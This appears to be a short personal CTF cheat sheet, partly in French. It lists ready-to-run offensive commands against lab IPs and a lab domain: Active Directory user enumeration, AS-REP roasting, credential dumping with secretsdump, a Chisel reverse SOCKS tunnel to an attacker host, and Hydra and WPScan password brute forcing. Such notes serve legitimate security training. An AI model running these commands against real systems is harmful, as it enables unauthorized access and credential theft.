- [Active Directory](#Active-Directory)
  - [Kerbrute](#Kerbrute)

## Active Directory

### Kerbrute
```
kerbute userenum --dc 10.10.117.125 -d spookysec.local user_list.txt
```
### GetNPUsers.py (Impacket)
```
python /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile user.txt -dc-ip 10.10.117.125 spookysec.local/
```
### Secretsdump.py (Impacket)
```
python3 /opt/impacket/examples/secretsdump.py -just-dc <user>@10.10.117.125
```

<br>
<br>

## Binwalk (data extraction)

```
binwalk <image> -e
```
<br>
<br>

## Chisel

```
chisel server -p 8001 --reverse
```
```
./chisel_amd64 client 10.50.111.37:8001 R:socks &
```
<br>
<br>

## Hydra
### WEB
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.0.156 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```
### SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.156
```
### FTP
```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<ip>
```
<br>

## JohnTheRipper (hash zipfile)

```
zip2john file.zip > zip.hash 
john file.zip zip.hash

```
<br>

## steghide

```
steghide extract -sf image.jpg
```

<br>

## WPSCAN

```
wpscan --url 10.10.188.11 -U kwheel -P /usr/share/wordlists/rockyou.txt
```
Fonctionne aussi avec une liste de user pour l'option `-U`

<br>

## 7z Deziper avec password

```
7z e file.zip
```
